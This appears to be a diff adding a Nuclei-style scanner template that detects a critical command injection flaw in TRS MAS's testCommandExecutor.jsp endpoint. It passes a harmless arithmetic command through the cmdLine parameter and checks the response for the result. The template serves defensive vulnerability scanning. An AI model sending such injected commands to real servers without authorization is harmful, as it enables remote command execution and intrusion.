@@ -1,0 +1,28 @@
+id: trs-mas-command-injection
+info:
+  name: TRS MAS Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects command injection vulnerability in TRS MAS via the testCommandExecutor.jsp endpoint.
+  reference:
+    - https://www.little2pig.work/archives/trs-mas
+    - https://x.threatbook.com/v5/vul/fb0f9a70f51b075c60d65a5eb51d5a7b6316224d977967fbf8d281df090c64fe308e638233d8b18c42dd015484b4e380
+variables:
+  r1: "{{rand_int(1000000, 2000000)}}"
+  r2: "{{rand_int(2000000, 3000000)}}"
+  sum: "{{to_number(r1) + to_number(r2)}}"
+http:
+  - raw:
+      - |
+        GET /mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20{{r1}}%20+%20{{r2}}&workDir=&pathEnv=&libPathEnv= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{sum}}"
+        part: body
